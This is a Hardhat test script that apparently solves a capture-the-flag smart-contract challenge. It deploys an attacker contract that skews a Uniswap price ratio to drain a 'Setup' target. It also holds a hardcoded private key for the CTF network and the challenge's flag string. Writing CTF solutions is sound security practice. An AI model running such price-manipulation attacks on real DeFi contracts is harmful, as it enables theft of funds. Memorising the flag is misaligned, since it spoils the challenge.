import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { deployOrGetAt, getEoaOrPrivateKey } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let eoaAddress: string;
let attacker: Contract;
let setup: Contract; // setup contract
let token: Contract;
let pair: Contract;
let broker: Contract;
let tx: any;

before(async () => {
  eoa = await getEoaOrPrivateKey(
    `0x3dd8959b306473ead211fb0f1d330d0870007f100cf824c15af3c582e1249ff4`
  );
  eoaAddress = await eoa.getAddress();

  setup = await deployOrGetAt(
    `contracts/secure/public/contracts/Setup.sol:Setup`,
    `0x02f0572a7D8322A2506b96C25cF81a39B6db726B`,
    eoa,
    { value: ethers.utils.parseEther(`50`) }
  );
});

it("solves the challenge", async function () {
  // eoa starts with 5k ethereum on CTF network
  console.log(`EOA starts with`, ethers.utils.formatEther(await eoa.getBalance()))

  // skew the uniswap price such that the ratio is 1:1 and pay back all tokens
  const attackerFactory = await ethers.getContractFactory(`SecureAttacker`, eoa);
  attacker = await attackerFactory.deploy(setup.address);

  tx = await attacker.attack({ value: ethers.utils.parseEther(`50`)})
  await tx.wait()

  // PCTF{7h1nk1ng_0U751dE_7he_80X}
});
